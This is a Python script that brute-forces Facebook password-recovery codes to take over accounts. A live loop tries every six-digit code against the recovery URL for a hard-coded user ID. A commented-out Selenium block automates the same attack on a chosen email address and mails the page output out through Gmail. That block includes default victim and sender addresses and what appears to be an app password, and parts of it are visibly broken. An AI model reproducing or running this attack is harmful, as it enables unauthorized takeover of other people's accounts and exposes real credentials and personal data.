#! /usr/bin/python
# Now you can interact with the Chrome browser using WebDriver commands
from selenium.webdriver import Keys, ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from time import sleep
from bs4 import BeautifulSoup
import itertools, sys, requests, mechanize, os, re, email, smtplib, ssl, selenium, shutil
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import logging
import selenium.webdriver
from selenium import webdriver


MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 
import signal


def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)

class GracefulInterruptHandler(object):

    def __init__(self, sig=signal.SIGINT):
        self.sig = sig

    def __enter__(self):

        self.interrupted = False
        self.released = False

        self.original_handler = signal.getsignal(self.sig)

        def handler(signum, frame):
            self.release()
            self.interrupted = True

        signal.signal(self.sig, handler)

        return self

    def __exit__(self, type, value, tb):
        self.release()

    def release(self):

        if self.released:
            return False

        signal.signal(self.sig, self.original_handler)

        self.released = True

        return True

i = 0

array = [0,0,0,0,0,0]
chars = "0123456789"
user_id = "100001223312778"
lock = False

with GracefulInterruptHandler() as h:
    for i in range(1000000):
        password = ""

        i+=1
        if i % 10000 == 0:
            print(f'{i / 10000} / 100')

        for j in range(6):
            password += chars[array[j]]

        for j in range(6):
            array[j] += 1
            if array[j] >= 10:
                array[j] = 0
                break

        try:
            x = requests.get(f'https://www.facebook.com/recover/password/?u={user_id}&n={password}')
        except:
            if not lock:
                i-=1
                lock = True
            continue
        lock = False
        if 'password_new' in x.text:
            print(f'connect to https://www.facebook.com/recover/password/?u={user_id}&n={password}')
            sys.exit()

        if h.interrupted:
            break


"""
def sleepy(counter):
  x = counter
  y = 0
  while x > y:
    x -= 1
    z = x
    if x <= 9:
      code = ("0", str(z))
      h = ""
      yo = h.join(code)
      x 
      print(yo, end='\r')
    else:
      print(x, end='\r')
    sleep(1)

def fb_hack(email, codex, respect):
  os.system('clear')
  soup = BeautifulSoup()
  cursor.hide()
  options = webdriver.ChromeOptions()
  options.add_argument("--no-sandbox")
  options.add_argument("--disable-dev-shm-usage")
  options.add_argument("--headless=new")
  driver = webdriver.Chrome(options=options)
  driver.get("https://facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&_fb_noscript=l")
  html = driver.page_source
  soup = BeautifulSoup(html, 'html.parser')
  try:
    search_box = driver.find_element(by = By.ID, value = "identify_email")
    search_box.send_keys(email)
    search_box.send_keys(Keys.ENTER)
    sleep(2)
  else:
    sleep(2)
    driver.save_screenshot("fail1.png")
    print("Failed at email")
    cursor.show()
  try:
    search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
    search_button.click()
    sleep(2)
  else:
    sleep(2)
    driver.save_screenshot("fail2.png")
    print("Failed at try another way")
    cursor.show()
  try:
    search_button = driver.find_element(by = By.NAME, value = "reset_action")
    search_button.click()
    sleep(2)
  else:
    sleep(2)
    driver.save_screenshot("fail3.png")
    print("Failed at reset action")
    cursor.show()
  counter = 0
  test = soup.find(string="pop")
  sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
  eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
  if sixdigits != test:
    print(sixdigits)
    respect = int(6)
  else:
    print(eightdigits)
    respect = int(8)
  for combination in itertools.product(range(10), repeat=int(respect)):
    p = (''.join(map(str, combination)))
    counter += 1
    if counter <= codex:
      cursor.hide()
      print("working", end='\r')
    else:
      try:
        searchbox = driver.find_element(by = By.NAME, value = "n")
        searchbox.send_keys(p)
        searchbox.submit()
      except:
        html = driver.page_source
        soup = BeautifulSoup(html, 'html.parser')
        with open("output1.txt", "w") as file:
          file.write(str(soup))
        soup = BeautifulSoup(html, 'html.parser')
        with open("output1.html", "w") as file:
          file.write(str(soup))
        driver.save_screenshot("tester.png")
      could = int(counter)
      code1 = (str(could), str(p), "failed")
      code2 = (str(could), str(p), "check")
      h = " "
      yo = h.join(code1)
      yot = h.join(code2)
      html = driver.page_source
      soup = BeautifulSoup(html, 'html.parser')
      taw = soup.find(string="Try another way")
      if taw != "None":
        print(yo)
      else:
        print(yot)
        respect = 0
        break
      sleepy(30)
  cursor.show()
  past = int(respect)
  return past

os.system('clear')
ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
reset = int(input('Code: ') or 1)
past = int(input('Length: ') or 6)
sender_email = input("Your Email:") or "krarktel@gmail.com"
receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
while past != 0:
  fb_hack(ehack, reset)


subject = "An email with attachment from Python"
body = "This is an email with attachment sent from Python"
# Create a multipart message and set headers
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Bcc"] = receiver_email  # Recommended for mass emails
# Add body to email
message.attach(MIMEText(body, "plain"))

filename = "output1.txt"  # In same directory as script
# Open PDF file in binary mode
with open(filename, "rb") as attachment:
    # Add file as application/octet-stream
    # Email client can usually download this automatically as attachment
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

# Encode file in ASCII characters to send by email    
encoders.encode_base64(part)

# Add header as key/value pair to attachment part
part.add_header("Content-Disposition", f"attachment; filename= {filename}",)

# Add attachment to message and convert message to string
message.attach(part)
text = message.as_string()

# Log in to server using secure context and send email
context = ssl.create_default_context()
with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
    server.login(sender_email, password)
    server.sendmail(sender_email, receiver_email, text)
"""
